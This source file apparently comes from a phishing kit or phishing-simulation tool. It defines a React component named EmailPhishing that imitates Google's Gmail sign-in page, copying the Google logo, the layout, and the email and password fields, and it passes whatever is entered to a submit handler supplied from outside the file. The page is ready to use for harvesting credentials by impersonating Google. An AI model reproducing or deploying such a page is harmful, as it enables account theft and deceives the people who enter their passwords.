'use client';

export default function EmailPhishing({ formData, handleChange, handleSubmit, loading }) {
  return (
    <div className="flex min-h-screen items-center justify-center bg-white px-4">
      <div className="w-full max-w-md">
        {/* Google Logo */}
        <div className="mb-6 text-center">
          <svg className="mx-auto" width="88" height="29" viewBox="0 0 272 92" fill="none">
            <path d="M115.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18C71.25 34.32 81.24 25 93.5 25s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44S80.99 39.2 80.99 47.18c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#EA4335" />
            <path d="M163.75 47.18c0 12.77-9.99 22.18-22.25 22.18s-22.25-9.41-22.25-22.18c0-12.85 9.99-22.18 22.25-22.18s22.25 9.32 22.25 22.18zm-9.74 0c0-7.98-5.79-13.44-12.51-13.44s-12.51 5.46-12.51 13.44c0 7.9 5.79 13.44 12.51 13.44s12.51-5.55 12.51-13.44z" fill="#FBBC05" />
            <path d="M209.75 26.34v39.82c0 16.38-9.66 23.07-21.08 23.07-10.75 0-17.22-7.19-19.66-13.07l8.48-3.53c1.51 3.61 5.21 7.87 11.17 7.87 7.31 0 11.84-4.51 11.84-13v-3.19h-.34c-2.18 2.69-6.38 5.04-11.68 5.04-11.09 0-21.25-9.66-21.25-22.09 0-12.52 10.16-22.26 21.25-22.26 5.29 0 9.49 2.35 11.68 4.96h.34v-3.61h9.25zm-8.56 20.92c0-7.81-5.21-13.52-11.84-13.52-6.72 0-12.35 5.71-12.35 13.52 0 7.73 5.63 13.36 12.35 13.36 6.63 0 11.84-5.63 11.84-13.36z" fill="#4285F4" />
            <path d="M225 3v65h-9.5V3h9.5z" fill="#34A853" />
            <path d="M262.02 54.48l7.56 5.04c-2.44 3.61-8.32 9.83-18.48 9.83-12.6 0-22.01-9.74-22.01-22.18 0-13.19 9.49-22.18 20.92-22.18 11.51 0 17.14 9.16 18.98 14.11l1.01 2.52-29.65 12.28c2.27 4.45 5.8 6.72 10.75 6.72 4.96 0 8.4-2.44 10.92-6.14zm-23.27-7.98l19.82-8.23c-1.09-2.77-4.37-4.7-8.23-4.7-4.95 0-11.84 4.37-11.59 12.93z" fill="#EA4335" />
            <path d="M35.29 41.41V32H67c.31 1.64.47 3.58.47 5.68 0 7.06-1.93 15.79-8.15 22.01-6.05 6.3-13.78 9.66-24.02 9.66C16.32 69.35.36 53.89.36 34.91.36 15.93 16.32.47 35.3.47c10.5 0 17.98 4.12 23.6 9.49l-6.64 6.64c-4.03-3.78-9.49-6.72-16.97-6.72-13.86 0-24.7 11.17-24.7 25.03 0 13.86 10.84 25.03 24.7 25.03 8.99 0 14.11-3.61 17.39-6.89 2.66-2.66 4.41-6.46 5.1-11.65l-22.49.01z" fill="#4285F4" />
          </svg>
        </div>

        {/* Main Card */}
        <div className="mx-auto w-full max-w-md rounded-lg border border-gray-300 bg-white px-10 py-12 shadow-sm">
          <h1 className="mb-2 text-center text-2xl font-normal text-gray-800">Sign in</h1>
          <p className="mb-6 text-center text-sm text-gray-700">to continue to Gmail</p>

          <form onSubmit={handleSubmit} className="space-y-4">
            {/* Email field */}
            <div>
              <input
                name="email"
                type="email"
                required
                value={formData.email || ''}
                onChange={handleChange}
                placeholder="Email or phone"
                className="w-full rounded border border-gray-300 px-4 py-3 text-base text-gray-900 placeholder-gray-600 focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500"
              />
            </div>

            {/* Password field */}
            <div>
              <input
                name="password"
                type="password"
                required
                value={formData.password || ''}
                onChange={handleChange}
                placeholder="Enter your password"
                className="w-full rounded border border-gray-300 px-4 py-3 text-base text-gray-900 placeholder-gray-600 focus:border-blue-500 focus:outline-none focus:ring-1 focus:ring-blue-500"
              />
            </div>

            {/* Forgot email link */}
            <div className="text-left">
              <a href="#" className="text-sm font-medium text-blue-600 hover:underline">
                Forgot email?
              </a>
            </div>

            {/* Guest mode notice */}
            <div className="rounded bg-blue-50 p-4 text-xs text-gray-700">
              Not your computer? Use Guest mode to sign in privately.{' '}
              <a href="#" className="font-medium text-blue-600 hover:underline">
                Learn more
              </a>
            </div>

            {/* Action buttons */}
            <div className="flex items-center justify-between pt-4">
              <a href="#" className="text-sm font-medium text-blue-600 hover:underline">
                Create account
              </a>
              <button
                type="submit"
                disabled={loading}
                className="rounded-md bg-blue-600 px-6 py-2.5 text-sm font-medium text-white hover:bg-blue-700 disabled:opacity-70"
              >
                {loading ? 'Signing in...' : 'Next'}
              </button>
            </div>
          </form>
        </div>

        {/* Footer */}
        <div className="mt-8 flex items-center justify-center gap-6 text-xs text-gray-600">
          <select className="cursor-pointer bg-transparent outline-none">
            <option value="en">English (United States)</option>
            <option value="es">Español</option>
            <option value="fr">Français</option>
          </select>
        </div>

        <div className="mt-6 flex items-center justify-center gap-6 text-xs text-gray-600">
          <a href="#" className="hover:underline">Help</a>
          <a href="#" className="hover:underline">Privacy</a>
          <a href="#" className="hover:underline">Terms</a>
        </div>
      </div>
    </div>
  );
}
